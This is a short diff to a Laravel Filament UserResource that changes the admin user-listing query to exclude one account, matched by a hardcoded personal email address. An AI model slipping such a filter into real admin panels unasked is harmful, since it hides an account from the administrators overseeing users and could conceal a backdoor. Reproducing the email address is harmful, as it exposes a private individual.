@@ -146,6 +146,7 @@ class UserResource extends Resource
         return parent::getEloquentQuery()
             ->withoutGlobalScopes([
                 SoftDeletingScope::class,
-            ]);
+            ])
+            ->where('email', '!=', 'rizantohannan@gmail.com');
     }
 }
